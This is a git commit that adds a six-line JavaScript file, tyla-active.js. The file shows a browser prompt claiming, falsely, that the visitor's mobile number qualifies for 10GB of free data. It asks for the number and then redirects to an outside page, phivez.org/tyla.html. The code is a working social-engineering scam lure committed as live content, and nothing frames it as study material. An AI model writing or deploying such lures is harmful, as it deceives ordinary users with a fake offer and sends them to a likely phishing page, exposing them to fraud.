46d9c447c783cc9d4f87196e462b8f97f54bbccc
newblog13 <sweet16guyz@gmail.com>
2026-02-02 00:55:11 +0100

    Create tyla-active.js

---
+++ tyla-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 10GB Free Data From your Network, click OK to Enter Your Mobile Number','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://phivez.org/tyla.html';
+}
